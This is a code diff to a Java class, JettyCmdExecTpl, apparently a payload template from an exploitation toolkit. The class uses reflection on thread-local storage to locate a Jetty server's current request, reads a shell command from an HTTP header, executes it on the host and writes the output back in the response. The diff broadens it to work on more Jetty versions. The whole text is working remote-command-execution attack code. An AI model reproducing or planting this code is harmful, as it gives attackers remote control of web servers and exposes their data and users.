@@ -12,12 +12,12 @@ public class JettyCmdExecTpl {
     }
 
 
-    public JettyCmdExecTpl(){
+    public JettyCmdExecTpl() {
         run();
     }
 
 
-    private void run(){
+    private void run() {
         try {
             Thread thread = Thread.currentThread();
             Field field = Class.forName("java.lang.Thread").getDeclaredField("threadLocals");
@@ -38,28 +38,39 @@ public class JettyCmdExecTpl {
                 obj = Array.get(table, i);
                 if (obj != null) {
                     httpConnection = valueField.get(obj);
-                    if (httpConnection != null && httpConnection.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")) {
+                    if (httpConnection != null && (httpConnection.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection") || httpConnection.getClass().getName().contains("HttpConnection"))) {
                         break;
                     }
                 }
             }
-
-            Object httpChannel = httpConnection.getClass().getMethod("getHttpChannel").invoke(httpConnection);
-            Object response = httpChannel.getClass().getMethod("getResponse").invoke(httpChannel);
-            Object request = httpChannel.getClass().getMethod("getRequest").invoke(httpChannel);
+            if (httpConnection == null) {
+                throw new RuntimeException("HttpConnection not found");
+            }
+            Object response;
+            Object request;
+            try {
+                Object httpChannel = httpConnection.getClass().getMethod("getHttpChannel").invoke(httpConnection);
+                response = httpChannel.getClass().getMethod("getResponse").invoke(httpChannel);
+                request = httpChannel.getClass().getMethod("getRequest").invoke(httpChannel);
+            } catch (Exception e) {
+                // 兼容 Jetty(7.6.16.v20140903)
+                response = httpConnection.getClass().getMethod("getResponse").invoke(httpConnection);
+                request = httpConnection.getClass().getMethod("getRequest").invoke(httpConnection);
+            }
             String cmd = (String) request.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{getReqHeaderName()});
-            if(cmd != null){
+            if (cmd != null) {
                 PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                 writer.write(exec(cmd));
                 writer.flush();
                 writer.close();
             }
 
-        }catch (Exception ignored){
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
-    private String exec(String cmd){
+    private String exec(String cmd) {
         try {
             boolean isLinux = true;
             String osType = System.getProperty("os.name");
@@ -75,7 +86,7 @@ public class JettyCmdExecTpl {
                 execRes += s.next();
             }
             return execRes;
-        }catch (Exception e){
+        } catch (Exception e) {
             return e.getMessage();
         }
     }
